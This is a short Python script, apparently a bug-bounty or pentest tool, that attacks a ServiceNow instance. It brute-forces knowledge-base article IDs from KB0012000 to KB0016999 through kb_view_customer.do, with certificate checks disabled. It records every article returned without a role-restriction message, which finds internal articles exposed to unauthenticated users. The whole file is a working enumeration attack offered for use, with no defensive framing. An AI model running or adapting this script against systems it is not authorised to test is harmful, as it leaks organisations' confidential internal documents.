#!/usr/bin/env python
#
# 
#
# service-now.py - Finding KB articles that should only be internal.
#
# By @RandomRobbieBF
# 
#

import requests
import sys
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True ,default="http://my.service-now.com",help="URL to test")
parser.add_argument("-p", "--proxy", default="http://127.0.0.1:8085",required=False, help="Proxy for debugging")

args = parser.parse_args()
url = args.url
proxy = args.proxy




http_proxy = proxy
proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy, 
              "ftp"   : http_proxy
            }
  
  
def test_url(url,i):
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
	try:
		newurl = ""+url+"/kb_view_customer.do?sysparm_article=KB00"+str(i)+""
		response = session.post(newurl, headers=headers,verify=False, proxies=proxyDict,timeout=30)
		if response.status_code == 200:
			if "1 out of 5 Star Rating" in response.text:
				if "INSUFFICIENT ROLES TO VIEW PROTECTED ARTICLE" not in response.text:
					print("[+] Found article for KB00"+str(i)+" [+]")
					text_file = open("found.txt", "a")
					text_file.write(""+newurl+"\n")
					text_file.close()
			else:
				print("[-] No Luck for KB00"+str(i)+" [-]")
		else:
			print("[-] No Luck for KB00"+str(i)+" [-]")
	except:
		print ("[-]Check Url might have Issues[-]")
		sys.exit(0)
		
for i in range(12000,17000):
	  test_url(url,i)
